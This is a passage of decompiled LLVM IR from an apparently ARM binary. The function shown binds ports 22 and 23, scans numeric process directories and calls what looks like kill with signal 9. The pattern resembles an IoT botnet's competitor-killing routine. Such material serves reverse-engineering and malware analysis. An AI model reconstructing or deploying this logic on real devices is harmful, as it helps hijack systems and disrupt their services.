  %v2_e70c = inttoptr i32 %v1_e70c to i8*
  %v3_e70c = load i8, i8* %v2_e70c, align 1
  %v2_e710 = icmp eq i8 %v3_e70c, 0
  %v1_e714 = add i32 %v0_e71482, 1
  br i1 %v2_e710, label %dec_label_pc_e74c, label %dec_label_pc_e71c

dec_label_pc_ea80:                                ; preds = %dec_label_pc_e544
  store i8 48, i8* %stack_var_-68, align 1
  br label %dec_label_pc_e5f4

; uselistorder directives
  uselistorder i32 %v1_e714, { 1, 0 }
  uselistorder i8 %v3_e70c, { 1, 0 }
  uselistorder i32 %v0_e74c85, { 1, 0 }
  uselistorder i32 %v1_ea50, { 4, 3, 0, 2, 5, 1 }
  uselistorder i32 %v2_ea08, { 1, 0 }
  uselistorder i32 %v1_e778, { 1, 0 }
  uselistorder i32 %v0_e78428, { 1, 0 }
  uselistorder i32 %v1_e79c, { 0, 3, 1, 2 }
  uselistorder i32 %v0_e740, { 1, 0 }
  uselistorder i32 %v0_e71482, { 1, 0 }
  uselistorder i32 %v0_ea50, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_e74c86, { 1, 2, 0 }
  uselistorder i32 %v1_e71456, { 1, 0 }
  uselistorder i32 %v2_e6f8, { 1, 0 }
  uselistorder i32 %v1_e6f4, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v0_e6b013, { 1, 0, 2 }
  uselistorder i32 %v0_e6a0, { 1, 0 }
  uselistorder i32 %v1_e680, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v4_e614, { 1, 2, 0 }
  uselistorder i32 %v2_e56c, { 1, 0, 2 }
  uselistorder i32 %v2_e558, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i8* %stack_var_-581, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-68, { 2, 0, 1 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32)* @function_12608, { 1, 0, 4, 2, 3 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_15760.23 to i32), { 2, 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_12734, { 1, 0 }
  uselistorder label %dec_label_pc_e70c.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ea40, { 1, 0 }
  uselistorder label %dec_label_pc_ea28, { 1, 0 }
  uselistorder label %dec_label_pc_ea20, { 1, 0 }
  uselistorder label %dec_label_pc_ea14, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e9fc, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e90c, { 1, 0 }
  uselistorder label %dec_label_pc_e90cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_e8f4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_e810, { 1, 0 }
  uselistorder label %dec_label_pc_e810.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e800.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e798, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e740, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e71c, { 1, 0 }
  uselistorder label %dec_label_pc_e6c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e624.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_e674, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_e63c, { 1, 0 }
  uselistorder label %dec_label_pc_e5f4, { 1, 0 }
}

define i32 @function_eab0(i32 %arg1) local_unnamed_addr {
dec_label_pc_eab0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-4312 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-8408 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-8428 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_eab0 = load i32, i32* @r4, align 4
  store i32 %v3_eab0, i32* %stack_var_-36, align 4
  %v6_eab0 = load i32, i32* @r5, align 4
  %v9_eab0 = load i32, i32* @r6, align 4
  %v12_eab0 = load i32, i32* @r7, align 4
  %v15_eab0 = load i32, i32* @r8, align 4
  %v18_eab0 = load i32, i32* @sb, align 4
  %v21_eab0 = load i32, i32* @sl, align 4
  %v24_eab0 = load i32, i32* @fp, align 4
  %v2_eac0 = call i32 @function_1316c(i32* null)
  store i32 %v2_eac0, i32* @r7, align 4
  %v0_eac8 = call i32 @function_12ec8()
  %v7_eacc = icmp eq i32 %v0_eac8, -1
  %. = zext i1 %v7_eacc to i32
  %tmp212 = icmp slt i32 %v0_eac8, 1
  %storemerge174 = select i1 %tmp212, i32 %., i32 1
  store i32 %storemerge174, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1e474.97 to i32), i32* %r3.global-to-local, align 4
  %v2_eae8 = icmp eq i32 %storemerge174, 0
  store i32 %v0_eac8, i32* @global_var_1e474.97, align 4
  br i1 %v2_eae8, label %dec_label_pc_eb00, label %dec_label_pc_eaf4

dec_label_pc_eaf4:                                ; preds = %dec_label_pc_eccc, %dec_label_pc_ebb4, %dec_label_pc_eab0
  %v29_eafc = phi i32 [ %v3_ec58, %dec_label_pc_ebb4 ], [ %v0_eac8, %dec_label_pc_eab0 ], [ 0, %dec_label_pc_eccc ]
  %v2_eafc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_eafc, i32* @r4, align 4
  store i32 %v6_eab0, i32* @r5, align 4
  store i32 %v9_eab0, i32* @r6, align 4
  store i32 %v12_eab0, i32* @r7, align 4
  store i32 %v15_eab0, i32* @r8, align 4
  store i32 %v18_eab0, i32* @sb, align 4
  store i32 %v21_eab0, i32* @sl, align 4
  store i32 %v24_eab0, i32* @fp, align 4
  ret i32 %v29_eafc

dec_label_pc_eb00:                                ; preds = %dec_label_pc_eab0
  %v2_eb00 = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v2_eb00, i32* %r1.global-to-local, align 4
  store i32 2, i32* @r6, align 4
  store i32 2, i32* %stack_var_-72, align 4
  %v1_eb18 = call i32 @function_e544(i32 5888)
  store i32 23, i32* %r3.global-to-local, align 4
  %v0_eb24 = load i32, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_eb2c = load i32, i32* @r5, align 4
  store i32 %v0_eb2c, i32* %r2.global-to-local, align 4
  %v3_eb38 = call i32 @function_13790(i32 %v0_eb24, i32 1, i32 %v0_eb2c)
  %v7_eb3c = icmp eq i32 %v3_eb38, -1
  store i32 %v3_eb38, i32* @r4, align 4
  br i1 %v7_eb3c, label %dec_label_pc_eb64, label %dec_label_pc_eb48

dec_label_pc_eb48:                                ; preds = %dec_label_pc_eb00
  %v2_eb4c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_eb4c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_eb54 = bitcast i32* %stack_var_-72 to %sockaddr*
  %v4_eb54 = call i32 @function_135c0(i32 %v3_eb38, %sockaddr* %v3_eb54, i32 16)
  %v0_eb58 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_eb60 = call i32 @function_13674(i32 %v0_eb58, i32 1)
  br label %dec_label_pc_eb64

dec_label_pc_eb64:                                ; preds = %dec_label_pc_eb00, %dec_label_pc_eb48
  %v1_eb68 = call i32 @function_e544(i32 5632)
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_eb74 = load i32, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_eb7c = load i32, i32* @r5, align 4
  store i32 %v0_eb7c, i32* %r2.global-to-local, align 4
  %v3_eb88 = call i32 @function_13790(i32 %v0_eb74, i32 1, i32 %v0_eb7c)
  %v7_eb8c = icmp eq i32 %v3_eb88, -1
  store i32 %v3_eb88, i32* @r4, align 4
  br i1 %v7_eb8c, label %dec_label_pc_ebb4, label %dec_label_pc_eb98

dec_label_pc_eb98:                                ; preds = %dec_label_pc_eb64
  %v2_eb9c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_eb9c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_eba4 = bitcast i32* %stack_var_-72 to %sockaddr*
  %v4_eba4 = call i32 @function_135c0(i32 %v3_eb88, %sockaddr* %v3_eba4, i32 16)
  %v0_eba8 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_ebb0 = call i32 @function_13674(i32 %v0_eba8, i32 1)
  br label %dec_label_pc_ebb4

dec_label_pc_ebb4:                                ; preds = %dec_label_pc_eb64, %dec_label_pc_eb98
  %v1_ebb8 = call i32 @function_142c4(i32 5)
  %v1_ebc0 = call i32 @function_13940(i32 4096)
  store i32 ptrtoint (i32* @global_var_1e3d8.103 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e470.105 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_ebc0, i32* %r2.global-to-local, align 4
  %v0_ebd0 = load i32, i32* @r5, align 4
  %v1_ebd0 = trunc i32 %v0_ebd0 to i8
  %v3_ebd0 = inttoptr i32 %v1_ebc0 to i8*
  store i8 %v1_ebd0, i8* %v3_ebd0, align 1
  %v0_ebd8 = load i32, i32* @r5, align 4
  %v1_ebd8 = load i32, i32* %r3.global-to-local, align 4
  %v2_ebd8 = inttoptr i32 %v1_ebd8 to i32*
  store i32 %v0_ebd8, i32* %v2_ebd8, align 4
  %v0_ebdc = load i32, i32* %r2.global-to-local, align 4
  %v1_ebdc = load i32, i32* %r1.global-to-local, align 4
  %v2_ebdc = inttoptr i32 %v1_ebdc to i32*
  store i32 %v0_ebdc, i32* %v2_ebdc, align 4
  %v1_ebe0 = call i32 @function_11c08(i32 6)
  %v1_ebe8 = call i32 @function_11c08(i32 7)
  %v0_ebec = load i32, i32* @r5, align 4
  store i32 %v0_ebec, i32* %r1.global-to-local, align 4
  %v2_ebf4 = inttoptr i32 %v0_ebec to i32*
  %v3_ebf4 = call i32 @function_11b24(i32 6, i32* %v2_ebf4)
  %v2_ebfc = ptrtoint i32* %stack_var_-8408 to i32
  store i32 %v2_ebfc, i32* @r8, align 4
  store i32 %v3_ebf4, i32* %r1.global-to-local, align 4
  store i32 %v2_ebfc, i32* @r0, align 4
  %v2_ec08 = bitcast i32* %stack_var_-8408 to i8*
  %v3_ec08 = call i32 @function_12504(i8* %v2_ec08, i32 %v3_ebf4)
  %v0_ec0c = load i32, i32* @r8, align 4
  %v2_ec0c = add i32 %v0_ec0c, %v3_ec08
  store i32 %v2_ec0c, i32* @r4, align 4
  %v0_ec10 = call i32 @function_12ef4()
  %v2_ec18 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_ec18, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_ec20 = trunc i32 %v0_ec10 to i8
  %v4_ec20 = call i32 @function_129d0(i8 %v3_ec20, i32 10, i32 %v2_ec18)
  store i32 %v4_ec20, i32* %r1.global-to-local, align 4
  %v0_ec28 = load i32, i32* @r4, align 4
  store i32 %v0_ec28, i32* @r0, align 4
  %v2_ec2c = inttoptr i32 %v0_ec28 to i8*
  %v3_ec2c = call i32 @function_12504(i8* %v2_ec2c, i32 %v4_ec20)
  %v0_ec30 = load i32, i32* @r5, align 4
  store i32 %v0_ec30, i32* %r1.global-to-local, align 4
  %v0_ec34 = load i32, i32* @r4, align 4
  %v2_ec34 = add i32 %v0_ec34, %v3_ec2c
  store i32 %v2_ec34, i32* @r4, align 4
  %v2_ec3c = inttoptr i32 %v0_ec30 to i32*
  %v3_ec3c = call i32 @function_11b24(i32 7, i32* %v2_ec3c)
  store i32 %v3_ec3c, i32* %r1.global-to-local, align 4
  %v0_ec44 = load i32, i32* @r4, align 4
  store i32 %v0_ec44, i32* @r0, align 4
  %v2_ec48 = inttoptr i32 %v0_ec44 to i8*
  %v3_ec48 = call i32 @function_12504(i8* %v2_ec48, i32 %v3_ec3c)
  %v0_ec4c = load i32, i32* @r5, align 4
  store i32 %v0_ec4c, i32* %r1.global-to-local, align 4
  store i32 %v3_ec48, i32* @r6, align 4
  %v3_ec58 = call i32 @function_12fc8(i8* %v2_ec08, i32 %v0_ec4c)
  %v7_ec5c = icmp eq i32 %v3_ec58, -1
  br i1 %v7_ec5c, label %dec_label_pc_eaf4, label %dec_label_pc_ec64

dec_label_pc_ec64:                                ; preds = %dec_label_pc_ebb4
  %v1_ec64 = call i32 @function_12e9c(i32 %v3_ec58)
  %v1_ec6c = call i32 @function_11b50(i32 6)
  %v1_ec74 = call i32 @function_11b50(i32 7)
  store i32 ptrtoint (i32* @global_var_1e470.105 to i32), i32* %r3.global-to-local, align 4
  %v2_ec80 = load i32, i32* @global_var_1e470.105, align 4
  store i32 %v2_ec80, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v4_ec8c = call i32 @function_13090(i8* %v2_ec08, i32 %v2_ec80, i32 4095)
  %v7_ec90 = icmp eq i32 %v4_ec8c, -1
  br i1 %v7_ec90, label %.thread5.thread, label %bb215

.thread5.thread:                                  ; preds = %dec_label_pc_ec64
  %v0_ec9c54 = load i32, i32* @r4, align 4
  %v1_ec9c55 = load i32, i32* @r6, align 4
  %v2_ec9c56 = add i32 %v1_ec9c55, %v0_ec9c54
  store i32 %v2_ec9c56, i32* %r1.global-to-local, align 4
  br label %bb216

bb215:                                            ; preds = %dec_label_pc_ec64
  %v3_ec98 = load i32, i32* @global_var_1e470.105, align 4
  store i32 %v3_ec98, i32* %r3.global-to-local, align 4
  %v0_ec9c = load i32, i32* @r4, align 4
  %v1_ec9c = load i32, i32* @r6, align 4
  %v2_ec9c = add i32 %v1_ec9c, %v0_ec9c
  store i32 %v2_ec9c, i32* %r1.global-to-local, align 4
  %v1_eca0 = load i32, i32* @r5, align 4
  %v2_eca0 = trunc i32 %v1_eca0 to i8
  %v5_eca0 = add i32 %v3_ec98, %v4_ec8c
  %v6_eca0 = inttoptr i32 %v5_eca0 to i8*
  store i8 %v2_eca0, i8* %v6_eca0, align 1
  %v1_eca4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb216

bb216:                                            ; preds = %.thread5.thread, %bb215
  %v1_eca4 = phi i32 [ %v2_ec9c56, %.thread5.thread ], [ %v1_eca4.pre, %bb215 ]
  %v0_eca4 = load i32, i32* @r8, align 4
  %v2_eca4 = sub i32 %v1_eca4, %v0_eca4
  store i32 %v2_eca4, i32* %r1.global-to-local, align 4
  %v2_ecac = call i32 @function_1257c(i32 %v2_ebfc, i32 %v2_eca4)
  %v2_ecb8 = ptrtoint i32* %stack_var_-4312 to i32
  store i32 %v2_ecb8, i32* %r1.global-to-local, align 4
  store i32 %v2_ecb8, i32* %stack_var_-8428, align 4
  %v0_ecc0 = load i32, i32* @r5, align 4
  %v0_ecc4 = load i32, i32* @r7, align 4
  store i32 %v0_ecc4, i32* @r4, align 4
  store i32 400, i32* @r5, align 4
  %v2_edc0 = ptrtoint i32* %stack_var_-152 to i32
  %v2_edc4 = bitcast i32* %stack_var_-152 to i8*
  %v2_ee10 = ptrtoint i32* %stack_var_-216 to i32
  %v2_ee14 = bitcast i32* %stack_var_-216 to i8*
  %v2_ef84 = ptrtoint i32* %stack_var_-44 to i32
  %v2_ef94 = ptrtoint i32* %stack_var_-48 to i32
  %v2_efa8 = ptrtoint i32* %stack_var_-52 to i32
  %v2_efbc = ptrtoint i32* %stack_var_-40 to i32
  %v2_efd4 = ptrtoint i32* %stack_var_-56 to i32
  %v2_ee8c = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_eccc

dec_label_pc_eccc:                                ; preds = %dec_label_pc_ed84, %bb216
  %stack_var_-8420.0 = phi i32 [ %v0_ecc0, %bb216 ], [ %stack_var_-8420.3, %dec_label_pc_ed84 ]
  %v1_ecd0 = call i32 @function_11c08(i32 6)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ecdc = call i32 @function_11b24(i32 6, i32* null)
  store i32 %v3_ecdc, i32* @r0, align 4
  %v1_ece0 = call i32 @function_132a4(i32 %v3_ecdc)
  store i32 %v1_ece0, i32* @sl, align 4
  %v2_ece4 = icmp eq i32 %v1_ece0, 0
  br i1 %v2_ece4, label %dec_label_pc_eaf4, label %dec_label_pc_ecec

dec_label_pc_ecec:                                ; preds = %dec_label_pc_eccc
  %v1_ecf0 = call i32 @function_11b50(i32 6)
  %v0_ecf4117 = load i32, i32* @sl, align 4
  %v1_ecf8118 = inttoptr i32 %v0_ecf4117 to i32*
  %v2_ecf8119 = call i32 @function_133a0(i32* %v1_ecf8118)
  %v2_ecfc121 = icmp eq i32 %v2_ecf8119, 0
  br i1 %v2_ecfc121, label %dec_label_pc_ed84, label %dec_label_pc_ed04.preheader

dec_label_pc_ed04.preheader:                      ; preds = %dec_label_pc_ecec, %dec_label_pc_ecf4.backedge
  %v0_ed04133 = phi i32 [ %v2_ecf8, %dec_label_pc_ecf4.backedge ], [ %v2_ecf8119, %dec_label_pc_ecec ]
  %stack_var_-8420.1122 = phi i32 [ %stack_var_-8420.1.be, %dec_label_pc_ecf4.backedge ], [ %stack_var_-8420.0, %dec_label_pc_ecec ]
  br label %dec_label_pc_ed04

dec_label_pc_ed04:                                ; preds = %dec_label_pc_ed04.preheader, %dec_label_pc_ed6c
  %v0_ed14 = phi i32 [ %v2_ed78, %dec_label_pc_ed6c ], [ %v0_ed04133, %dec_label_pc_ed04.preheader ]
  %stack_var_-8420.2 = phi i32 [ %v1_ed28, %dec_label_pc_ed6c ], [ %stack_var_-8420.1122, %dec_label_pc_ed04.preheader ]
  %v1_ed04 = add i32 %v0_ed14, 11
  %v2_ed04 = inttoptr i32 %v1_ed04 to i8*
  %v3_ed04 = load i8, i8* %v2_ed04, align 1
  %v4_ed04 = zext i8 %v3_ed04 to i32
  %v1_ed08 = add nsw i32 %v4_ed04, -48
  store i32 %v1_ed08, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_ed08, 9
  br i1 %tmp, label %dec_label_pc_ecf4.backedge, label %dec_label_pc_ed14

dec_label_pc_ed14:                                ; preds = %dec_label_pc_ed04
  store i32 %v1_ed04, i32* @r6, align 4
  %v2_ed1c = call i32 @function_14084(i8* %v2_ed04)
  %v0_ed24 = load i32, i32* @r5, align 4
  %v1_ed28 = add i32 %stack_var_-8420.2, 1
  store i32 %v1_ed28, i32* %r2.global-to-local, align 4
  store i32 %v2_ed1c, i32* @r7, align 4
  %v5_ed34 = icmp slt i32 %v0_ed24, %v2_ed1c
  %v2_ed94 = call i32 @function_1316c(i32* null)
  br i1 %v5_ed34, label %dec_label_pc_ed90, label %dec_label_pc_ed38

dec_label_pc_ed38:                                ; preds = %dec_label_pc_ed14
  %v0_ed40 = load i32, i32* @r4, align 4
  %v2_ed40 = sub i32 %v2_ed94, %v0_ed40
  %v7_ed48 = icmp slt i32 %v2_ed40, 601
  br i1 %v7_ed48, label %dec_label_pc_ed50, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_ed38
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_ecf4.backedge

dec_label_pc_ed50:                                ; preds = %dec_label_pc_ed38
  %v0_ed50 = load i32, i32* @r7, align 4
  %v7_ed54 = icmp slt i32 %v0_ed50, 401
  br i1 %v7_ed54, label %dec_label_pc_ecf4.backedge, label %dec_label_pc_ed58

dec_label_pc_ed58:                                ; preds = %dec_label_pc_ed50
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_ed60 = call i32 @function_12bf8(i32 %v1_ed28, i32 10)
  %v2_ed64 = icmp eq i32 %v2_ed60, 0
  br i1 %v2_ed64, label %dec_label_pc_ed6c, label %dec_label_pc_ecf4.backedge

dec_label_pc_ed6c:                                ; preds = %dec_label_pc_ed58
  %v1_ed70 = call i32 @function_142c4(i32 1)
  %v0_ed74 = load i32, i32* @sl, align 4
  %v1_ed78 = inttoptr i32 %v0_ed74 to i32*
  %v2_ed78 = call i32 @function_133a0(i32* %v1_ed78)
  %v2_ed7c = icmp eq i32 %v2_ed78, 0
  br i1 %v2_ed7c, label %dec_label_pc_ed84, label %dec_label_pc_ed04

dec_label_pc_ed84:                                ; preds = %dec_label_pc_ecf4.backedge, %dec_label_pc_ed6c, %dec_label_pc_ecec
  %stack_var_-8420.3 = phi i32 [ %stack_var_-8420.0, %dec_label_pc_ecec ], [ %v1_ed28, %dec_label_pc_ed6c ], [ %stack_var_-8420.1.be, %dec_label_pc_ecf4.backedge ]
  %v0_ed84 = load i32, i32* @sl, align 4
  %v1_ed88 = inttoptr i32 %v0_ed84 to i32*
  %v2_ed88 = call i32 @function_131f0(i32* %v1_ed88)
  br label %dec_label_pc_eccc

dec_label_pc_ed90:                                ; preds = %dec_label_pc_ed14
  %v1_eda0 = call i32 @function_11c08(i32 6)
  %v1_eda8 = call i32 @function_11c08(i32 7)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_edb4 = call i32 @function_11b24(i32 6, i32* null)
  store i32 %v3_edb4, i32* %r1.global-to-local, align 4
  store i32 %v2_edc0, i32* @r0, align 4
  %v3_edc4 = call i32 @function_12504(i8* %v2_edc4, i32 %v3_edb4)
  store i32 %v2_edc0, i32* %r3.global-to-local, align 4
  %v2_edd0 = add i32 %v3_edc4, %v2_edc0
  store i32 %v2_edd0, i32* %r5.global-to-local, align 4
  %v0_edd4 = load i32, i32* @r6, align 4
  store i32 %v0_edd4, i32* %r1.global-to-local, align 4
  store i32 %v2_edd0, i32* @r0, align 4
  %v2_eddc = inttoptr i32 %v2_edd0 to i8*
  %v3_eddc = call i32 @function_12504(i8* %v2_eddc, i32 %v0_edd4)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_edec = call i32 @function_11b24(i32 7, i32* null)
  store i32 %v3_edec, i32* %r1.global-to-local, align 4
  %v0_edf4 = load i32, i32* %r5.global-to-local, align 4
  %v2_edf4 = add i32 %v3_eddc, %v0_edf4
  store i32 %v2_edf4, i32* @r0, align 4
  %v2_edf8 = inttoptr i32 %v2_edf4 to i8*
  %v3_edf8 = call i32 @function_12504(i8* %v2_edf8, i32 %v3_edec)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ee04 = call i32 @function_11b24(i32 6, i32* null)
  store i32 %v3_ee04, i32* %r1.global-to-local, align 4
  store i32 %v2_ee10, i32* @r0, align 4
  %v3_ee14 = call i32 @function_12504(i8* %v2_ee14, i32 %v3_ee04)
  %v2_ee20 = add i32 %v3_ee14, %v2_ee10
  store i32 %v2_ee20, i32* @r5, align 4
  %v0_ee24 = load i32, i32* @r6, align 4
  store i32 %v0_ee24, i32* %r1.global-to-local, align 4
  store i32 %v2_ee20, i32* @r0, align 4
  %v2_ee2c = inttoptr i32 %v2_ee20 to i8*
  %v3_ee2c = call i32 @function_12504(i8* %v2_ee2c, i32 %v0_ee24)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_ee2c, i32* @r4, align 4
  %v3_ee3c = call i32 @function_11b24(i32 11, i32* null)
  store i32 %v3_ee3c, i32* %r1.global-to-local, align 4
  %v0_ee44 = load i32, i32* @r5, align 4
  %v1_ee44 = load i32, i32* @r4, align 4
  %v2_ee44 = add i32 %v1_ee44, %v0_ee44
  store i32 %v2_ee44, i32* @r0, align 4
  %v2_ee48 = inttoptr i32 %v2_ee44 to i8*
  %v3_ee48 = call i32 @function_12504(i8* %v2_ee48, i32 %v3_ee3c)
  %v1_ee50 = call i32 @function_11b50(i32 6)
  %v1_ee58 = call i32 @function_11b50(i32 7)
  store i32 4095, i32* %r2.global-to-local, align 4
  %v2_ee6c = load i32, i32* %stack_var_-8428, align 4
  store i32 %v2_ee6c, i32* %r1.global-to-local, align 4
  %v4_ee70 = call i32 @function_13090(i8* %v2_edc4, i32 %v2_ee6c, i32 4095)
  %v7_ee78 = icmp eq i32 %v4_ee70, -1
  store i32 %v4_ee70, i32* @r5, align 4
  store i32 -4276, i32* @r2, align 4
  br i1 %v7_ee78, label %dec_label_pc_ef40, label %dec_label_pc_ee88

dec_label_pc_ee88:                                ; preds = %dec_label_pc_ed90
  store i32 %v2_ee8c, i32* %r1.global-to-local, align 4
  %v2_ee90 = add i32 %v4_ee70, %v2_ee8c
  store i32 %v2_ee90, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_ee98 = add i32 %v2_ee90, -4276
  %v5_ee98 = inttoptr i32 %v4_ee98 to i8*
  store i8 0, i8* %v5_ee98, align 1
  %v1_eea0 = call i32 @function_11c08(i32 10)
  %v0_eea4 = load i32, i32* @r4, align 4
  store i32 %v0_eea4, i32* %r1.global-to-local, align 4
  %v2_eeac = inttoptr i32 %v0_eea4 to i32*
  %v3_eeac = call i32 @function_11b24(i32 10, i32* %v2_eeac)
  %v0_eeb0 = load i32, i32* @r5, align 4
  %v1_eeb0 = add i32 %v0_eeb0, -1
  store i32 %v1_eeb0, i32* @r1, align 4
  store i32 %v3_eeac, i32* %r2.global-to-local, align 4
  %v2_eeb8 = load i32, i32* %stack_var_-8428, align 4
  %v3_eebc = inttoptr i32 %v2_eeb8 to i8*
  %v4_eebc = call i32 @function_12830(i8* %v3_eebc, i32 %v1_eeb0, i32 %v3_eeac)
  %v7_eec0 = icmp eq i32 %v4_eebc, -1
  br i1 %v7_eec0, label %dec_label_pc_eedc, label %dec_label_pc_eec8

dec_label_pc_eec8:                                ; preds = %dec_label_pc_ee88
  %v2_eec8 = load i32, i32* %stack_var_-8428, align 4
  %v1_eecc = inttoptr i32 %v2_eec8 to i8*
  %v2_eecc = call i32 @function_13198(i8* %v1_eecc)
  %v0_eed0 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_eed8 = call i32 @function_12f9c(i32 %v0_eed0, i32 9)
  br label %dec_label_pc_eedc

dec_label_pc_eedc:                                ; preds = %dec_label_pc_ee88, %dec_label_pc_eec8
  %v1_eee0 = call i32 @function_11b50(i32 10)
  %v0_eee4 = call i32 @function_12ef4()
  %v0_eee8 = load i32, i32* @r7, align 4
  %v9_eee8 = icmp eq i32 %v0_eee8, %v0_eee4
  br i1 %v9_eee8, label %dec_label_pc_ef14, label %dec_label_pc_eef0

dec_label_pc_eef0:                                ; preds = %dec_label_pc_eedc
  %v0_eef0 = call i32 @function_12f20()
  %v0_eef4 = load i32, i32* @r7, align 4
  %v9_eef4 = icmp eq i32 %v0_eef4, %v0_eef0
  br i1 %v9_eef4, label %dec_label_pc_ef14, label %dec_label_pc_eefc

dec_label_pc_eefc:                                ; preds = %dec_label_pc_eef0
  store i32 ptrtoint (i32* @global_var_1e470.105 to i32), i32* %r2.global-to-local, align 4
  %v2_ef00 = load i32, i32* %stack_var_-8428, align 4
  %v2_ef04 = load i32, i32* @global_var_1e470.105, align 4
  store i32 %v2_ef04, i32* %r1.global-to-local, align 4
  %v2_ef08 = inttoptr i32 %v2_ef00 to i8*
  %v3_ef08 = call i32 @function_128bc(i8* %v2_ef08, i32 %v2_ef04)
  %v2_ef0c = icmp eq i32 %v3_ef08, 0
  br i1 %v2_ef0c, label %dec_label_pc_ef20, label %dec_label_pc_eefc.dec_label_pc_ef14_crit_edge

dec_label_pc_eefc.dec_label_pc_ef14_crit_edge:    ; preds = %dec_label_pc_eefc
  %v0_ef18.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_ef14

dec_label_pc_ef14:                                ; preds = %dec_label_pc_eefc.dec_label_pc_ef14_crit_edge, %dec_label_pc_eef0, %dec_label_pc_eedc
  %v0_ef18 = phi i32 [ %v0_ef18.pre, %dec_label_pc_eefc.dec_label_pc_ef14_crit_edge ], [ %v0_eef0, %dec_label_pc_eef0 ], [ %v0_eee4, %dec_label_pc_eedc ]
  store i32 %v2_ed94, i32* @r4, align 4
  store i32 %v0_ef18, i32* @r5, align 4
  br label %dec_label_pc_ecf4.backedge

dec_label_pc_ecf4.backedge:                       ; preds = %dec_label_pc_ed58, %dec_label_pc_ed50, %dec_label_pc_ed04, %dec_label_pc_ef14, %dec_label_pc_f1c4, %.thread11
  %stack_var_-8420.1.be = phi i32 [ %v1_ed28, %dec_label_pc_f1c4 ], [ %v1_ed28, %dec_label_pc_ef14 ], [ %v1_ed28, %.thread11 ], [ %stack_var_-8420.2, %dec_label_pc_ed04 ], [ %v1_ed28, %dec_label_pc_ed50 ], [ %v1_ed28, %dec_label_pc_ed58 ]
  %v0_ecf4 = load i32, i32* @sl, align 4
  %v1_ecf8 = inttoptr i32 %v0_ecf4 to i32*
  %v2_ecf8 = call i32 @function_133a0(i32* %v1_ecf8)
  %v2_ecfc = icmp eq i32 %v2_ecf8, 0
  br i1 %v2_ecfc, label %dec_label_pc_ed84, label %dec_label_pc_ed04.preheader

dec_label_pc_ef20:                                ; preds = %dec_label_pc_eefc
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_ef24 = load i32, i32* %stack_var_-8428, align 4
  %v2_ef28 = inttoptr i32 %v2_ef24 to i8*
  %v3_ef28 = call i32 @function_12fc8(i8* %v2_ef28, i32 0)
  %v7_ef2c = icmp eq i32 %v3_ef28, -1
  store i32 %v3_ef28, i32* @r4, align 4
  br i1 %v7_ef2c, label %dec_label_pc_f1f8, label %dec_label_pc_ef38

